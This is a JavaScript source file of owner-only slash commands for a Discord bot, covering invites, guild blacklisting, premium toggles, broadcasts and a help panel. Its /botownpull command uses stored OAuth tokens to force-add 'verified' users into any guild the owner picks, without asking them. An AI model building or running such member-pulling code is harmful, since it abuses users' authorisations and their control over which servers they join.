import { SlashCommandBuilder, ChannelType, ActionRowBuilder, ButtonBuilder, ButtonStyle } from 'discord.js';
import { RocksUI } from '../../structures/classes/RocksUI.js';
import { config } from '../../config/config.js';
import { isBotOwner } from '../../utils/permCheck.js';
import { forceAddToGuild } from '../../server/oauth.js';
import { getValidToken, sleep } from '../../utils/tokenManager.js';
import BackupUser  from '../../database/schemas/BackupUser.js';
import GuildConfig from '../../database/schemas/GuildConfig.js';

// ─── /ping ────────────────────────────────────────────────────────────────────
export const ping = {
    data: new SlashCommandBuilder().setName('ping').setDescription('Check bot latency.').setDMPermission(true),
    async execute({ interaction, client }) {
        const sent = await interaction.deferReply({ fetchReply: true, flags: RocksUI.getFlags(true) });
        const ms   = sent.createdTimestamp - interaction.createdTimestamp;
        return interaction.editReply({ components: RocksUI.buildDetailedDashboard(`# ${config.emojis.dot} Pong!`, null, [{ name: 'Bot Latency', value: `${ms}ms` }, { name: 'API Latency', value: `${Math.round(client.ws.ping)}ms` }]), flags: RocksUI.getFlags() });
    },
};

// ─── /getinvite ───────────────────────────────────────────────────────────────
export const getinvite = {
    data: new SlashCommandBuilder().setName('getinvite').setDescription('[Owner] Get invite for any guild.').setDMPermission(true)
        .addStringOption(o => o.setName('guildid').setDescription('Guild ID').setRequired(true)),
    async execute({ interaction, client }) {
        if (!isBotOwner(interaction.user.id)) return interaction.reply({ components: RocksUI.buildStatusMessage('error', 'Bot owner only.'), flags: RocksUI.getFlags(true) });
        const guild = client.guilds.cache.get(interaction.options.getString('guildid'));
        if (!guild) return interaction.reply({ components: RocksUI.buildStatusMessage('error', 'Not in that guild.'), flags: RocksUI.getFlags(true) });
        const ch  = guild.channels.cache.find(c => c.isTextBased() && c.permissionsFor(guild.members.me).has('CreateInstantInvite'));
        if (!ch)  return interaction.reply({ components: RocksUI.buildStatusMessage('error', 'No available channel.'), flags: RocksUI.getFlags(true) });
        const inv = await ch.createInvite({ maxAge: 3600, reason: '[Owner]' }).catch(() => null);
        if (!inv) return interaction.reply({ components: RocksUI.buildStatusMessage('error', 'Failed.'), flags: RocksUI.getFlags(true) });
        return interaction.reply({ components: RocksUI.buildDetailedDashboard(`# ${config.emojis.dot} Invite`, null, [{ name: 'Guild', value: `${guild.name} (\`${guild.id}\`)` }, { name: 'Members', value: `${guild.memberCount}` }, { name: 'Link', value: `https://discord.gg/${inv.code}` }]), flags: RocksUI.getFlags(true) });
    },
};

// ─── /leaveguild ─────────────────────────────────────────────────────────────
export const leaveguild = {
    data: new SlashCommandBuilder().setName('leaveguild').setDescription('[Owner] Leave a guild.').setDMPermission(true)
        .addStringOption(o => o.setName('guildid').setDescription('Guild ID').setRequired(true)),
    async execute({ interaction, client }) {
        if (!isBotOwner(interaction.user.id)) return interaction.reply({ components: RocksUI.buildStatusMessage('error', 'Bot owner only.'), flags: RocksUI.getFlags(true) });
        const guild = client.guilds.cache.get(interaction.options.getString('guildid'));
        if (!guild) return interaction.reply({ components: RocksUI.buildStatusMessage('error', 'Not in that guild.'), flags: RocksUI.getFlags(true) });
        const name = guild.name; await guild.leave();
        return interaction.reply({ components: RocksUI.buildStatusMessage('tick', `Left **${name}**.`), flags: RocksUI.getFlags(true) });
    },
};

// ─── /blacklistguildadd / removeblacklist ─────────────────────────────────────
export const blacklistguildadd = {
    data: new SlashCommandBuilder().setName('blacklistguildadd').setDescription('[Owner] Blacklist a guild.').setDMPermission(true)
        .addStringOption(o => o.setName('guildid').setDescription('Guild ID').setRequired(true)),
    async execute({ interaction, client }) {
        if (!isBotOwner(interaction.user.id)) return interaction.reply({ components: RocksUI.buildStatusMessage('error', 'Bot owner only.'), flags: RocksUI.getFlags(true) });
        const id = interaction.options.getString('guildid');
        await GuildConfig.findOneAndUpdate({ guildId: id }, { blacklisted: true }, { upsert: true });
        const g = client.guilds.cache.get(id); if (g) await g.leave();
        return interaction.reply({ components: RocksUI.buildStatusMessage('tick', `Guild \`${id}\` blacklisted.`), flags: RocksUI.getFlags(true) });
    },
};

export const removeblacklist = {
    data: new SlashCommandBuilder().setName('removeblacklist').setDescription('[Owner] Remove guild from blacklist.').setDMPermission(true)
        .addStringOption(o => o.setName('guildid').setDescription('Guild ID').setRequired(true)),
    async execute({ interaction }) {
        if (!isBotOwner(interaction.user.id)) return interaction.reply({ components: RocksUI.buildStatusMessage('error', 'Bot owner only.'), flags: RocksUI.getFlags(true) });
        const id = interaction.options.getString('guildid');
        await GuildConfig.findOneAndUpdate({ guildId: id }, { blacklisted: false }, { upsert: true });
        return interaction.reply({ components: RocksUI.buildStatusMessage('tick', `Guild \`${id}\` removed from blacklist.`), flags: RocksUI.getFlags(true) });
    },
};

// ─── /premiumaguild ──────────────────────────────────────────────────────────
export const premiumaguild = {
    data: new SlashCommandBuilder().setName('premiumaguild').setDescription('[Owner] Manage guild premium.').setDMPermission(true)
        .addSubcommand(s => s.setName('add').setDescription('Grant premium.').addStringOption(o => o.setName('guildid').setDescription('Guild ID').setRequired(true)))
        .addSubcommand(s => s.setName('remove').setDescription('Remove premium.').addStringOption(o => o.setName('guildid').setDescription('Guild ID').setRequired(true))),
    async execute({ interaction, client }) {
        if (!isBotOwner(interaction.user.id)) return interaction.reply({ components: RocksUI.buildStatusMessage('error', 'Bot owner only.'), flags: RocksUI.getFlags(true) });
        const sub = interaction.options.getSubcommand(), id = interaction.options.getString('guildid');
        await GuildConfig.findOneAndUpdate({ guildId: id }, { isPremium: sub === 'add' }, { upsert: true });
        const g = client.guilds.cache.get(id);
        return interaction.reply({ components: RocksUI.buildStatusMessage('tick', `Premium **${sub === 'add' ? 'enabled' : 'removed'}** for ${g ? `**${g.name}**` : `\`${id}\``}.`), flags: RocksUI.getFlags(true) });
    },
};

// ─── /ticketguild ─────────────────────────────────────────────────────────────
export const ticketguild = {
    data: new SlashCommandBuilder().setName('ticketguild').setDescription('[Owner] Manage ticket access for guilds.').setDMPermission(true)
        .addSubcommand(s => s.setName('add').setDescription('Enable tickets for a guild.').addStringOption(o => o.setName('guildid').setDescription('Guild ID').setRequired(true)))
        .addSubcommand(s => s.setName('remove').setDescription('Disable tickets for a guild.').addStringOption(o => o.setName('guildid').setDescription('Guild ID').setRequired(true))),
    async execute({ interaction, client }) {
        if (!isBotOwner(interaction.user.id)) return interaction.reply({ components: RocksUI.buildStatusMessage('error', 'Bot owner only.'), flags: RocksUI.getFlags(true) });
        const sub = interaction.options.getSubcommand(), id = interaction.options.getString('guildid');
        await GuildConfig.findOneAndUpdate({ guildId: id }, { 'tickets.enabled': sub === 'add' }, { upsert: true });
        const g = client.guilds.cache.get(id);
        return interaction.reply({ components: RocksUI.buildStatusMessage('tick', `Tickets **${sub === 'add' ? 'enabled' : 'disabled'}** for ${g ? `**${g.name}**` : `\`${id}\``}.`), flags: RocksUI.getFlags(true) });
    },
};

// ─── /botownpull ─────────────────────────────────────────────────────────────
export const botownpull = {
    data: new SlashCommandBuilder().setName('botownpull').setDescription('[Owner] Force-pull any verified members into any guild.').setDMPermission(true)
        .addStringOption(o => o.setName('to_guild').setDescription('Destination Guild ID').setRequired(true))
        .addIntegerOption(o => o.setName('amount').setDescription('How many to pull').setRequired(true))
        .addStringOption(o => o.setName('from_guild').setDescription('Source Guild ID (optional)').setRequired(false)),
    async execute({ interaction, client }) {
        if (!isBotOwner(interaction.user.id)) return interaction.reply({ components: RocksUI.buildStatusMessage('error', 'Bot owner only.'), flags: RocksUI.getFlags(true) });
        const toId   = interaction.options.getString('to_guild');
        const fromId = interaction.options.getString('from_guild') || null;
        const amount = interaction.options.getInteger('amount');
        const toGuild = client.guilds.cache.get(toId);
        if (!toGuild) return interaction.reply({ components: RocksUI.buildStatusMessage('error', `Not in destination guild \`${toId}\`.`), flags: RocksUI.getFlags(true) });
        await interaction.deferReply({ flags: RocksUI.getFlags(true) });
        const pool = await BackupUser.find(fromId ? { guilds: fromId, status: 'active' } : { status: 'active' });
        await toGuild.members.fetch();
        const currentIds = new Set(toGuild.members.cache.map(m => m.user.id));
        const toPull = pool.filter(u => !currentIds.has(u.userId)).slice(0, amount);
        if (!toPull.length) return interaction.editReply({ components: RocksUI.buildStatusMessage('tick', 'No members to pull.'), flags: RocksUI.getFlags() });
        let pulled = 0, failed = 0;
        for (const u of toPull) {
            try { const token = await getValidToken(u.userId); const s = await forceAddToGuild(toId, u.userId, token); if (s === 201 || s === 204) pulled++; else failed++; } catch { failed++; }
            await sleep(1500);
        }
        return interaction.editReply({ components: RocksUI.buildDetailedDashboard(`# ${config.emojis.tick} BotOwn Pull`, null, [{ name: 'Destination', value: `${toGuild.name}` }, { name: 'Source', value: fromId || 'All servers' }, { name: 'Pulled', value: `${pulled}` }, { name: 'Failed', value: `${failed}` }]), flags: RocksUI.getFlags() });
    },
};

// ─── /broadcast ──────────────────────────────────────────────────────────────
export const broadcast = {
    data: new SlashCommandBuilder().setName('broadcast').setDescription('[Owner] Send message to all servers.').setDMPermission(true)
        .addStringOption(o => o.setName('message').setDescription('Message to broadcast').setRequired(true)),
    async execute({ interaction, client }) {
        if (!isBotOwner(interaction.user.id)) return interaction.reply({ components: RocksUI.buildStatusMessage('error', 'Bot owner only.'), flags: RocksUI.getFlags(true) });
        await interaction.deferReply({ flags: RocksUI.getFlags(true) });
        const message = interaction.options.getString('message');
        let sent = 0, failed = 0;
        for (const [, guild] of client.guilds.cache) {
            const ch = guild.channels.cache.find(c => c.type === ChannelType.GuildText && c.permissionsFor(guild.members.me)?.has('SendMessages') && (c.name.includes('general') || c.name.includes('bot')))
                    || guild.channels.cache.find(c => c.type === ChannelType.GuildText && c.permissionsFor(guild.members.me)?.has('SendMessages'));
            if (!ch) { failed++; continue; }
            try { await ch.send({ components: RocksUI.buildDashboard(`# ${config.emojis.vip} Announcement`, message), flags: RocksUI.getFlags() }); sent++; } catch { failed++; }
            await sleep(500);
        }
        return interaction.editReply({ components: RocksUI.buildDetailedDashboard(`# ${config.emojis.tick} Broadcast Complete`, null, [{ name: 'Sent', value: `${sent} servers` }, { name: 'Failed', value: `${failed} servers` }]), flags: RocksUI.getFlags() });
    },
};

// ─── /ownerhelp - interactive ─────────────────────────────────────────────────
const OWNER_SECTIONS = {
    server: {
        label: '🖥️ Server',
        content: [
            `${config.emojis.arrow} \`/getinvite <guildid>\` — Get invite for any guild`,
            `${config.emojis.arrow} \`/leaveguild <guildid>\` — Force leave a guild`,
            `${config.emojis.arrow} \`/blacklistguildadd <guildid>\` — Blacklist a guild`,
            `${config.emojis.arrow} \`/removeblacklist <guildid>\` — Remove from blacklist`,
        ],
    },
    premium: {
        label: '✨ Premium',
        content: [
            `${config.emojis.arrow} \`/premiumaguild add <guildid>\` — Grant premium`,
            `${config.emojis.arrow} \`/premiumaguild remove <guildid>\` — Remove premium`,
            `${config.emojis.arrow} \`/ticketguild add <guildid>\` — Enable tickets for guild`,
            `${config.emojis.arrow} \`/ticketguild remove <guildid>\` — Disable tickets`,
        ],
    },
    pull: {
        label: '🔀 Pull',
        content: [
            `${config.emojis.arrow} \`/botownpull <to_guild> <amount> [from_guild]\` — Pull verified members to any guild`,
        ],
    },
    misc: {
        label: '⚙️ Misc',
        content: [
            `${config.emojis.arrow} \`/ping\` — Bot latency`,
            `${config.emojis.arrow} \`/broadcast <message>\` — Announce to all servers`,
            `${config.emojis.arrow} \`/ownerhelp\` — This panel`,
        ],
    },
};

export const ownerhelp = {
    data: new SlashCommandBuilder().setName('ownerhelp').setDescription('[Owner] All owner commands.').setDMPermission(true),

    async execute({ interaction }) {
        if (!isBotOwner(interaction.user.id)) return interaction.reply({ components: RocksUI.buildStatusMessage('error', 'Bot owner only.'), flags: RocksUI.getFlags(true) });

        const desc = `${config.emojis.vip} Select a section to view owner commands.`;
        const row  = new ActionRowBuilder().addComponents(
            Object.entries(OWNER_SECTIONS).map(([k, s]) =>
                new ButtonBuilder().setCustomId(`ownerhelp_${k}`).setLabel(s.label).setStyle(ButtonStyle.Secondary)
            )
        );
        return interaction.reply({ components: RocksUI.buildDashboard(`# ${config.emojis.dot} Owner Help`, desc, [row]), flags: RocksUI.getFlags(true) });
    },

    async handleButton(interaction) {
        if (!isBotOwner(interaction.user.id)) return;
        const key = interaction.customId.replace('ownerhelp_', '');
        const sec = OWNER_SECTIONS[key];
        if (!sec) return;

        const row = new ActionRowBuilder().addComponents(
            Object.entries(OWNER_SECTIONS).map(([k, s]) =>
                new ButtonBuilder().setCustomId(`ownerhelp_${k}`).setLabel(s.label).setStyle(k === key ? ButtonStyle.Primary : ButtonStyle.Secondary)
            )
        );
        return interaction.update({ components: RocksUI.buildDashboard(`# ${config.emojis.dot} Owner Help — ${sec.label}`, sec.content.join('\n'), [row]), flags: RocksUI.getFlags() });
    },
};
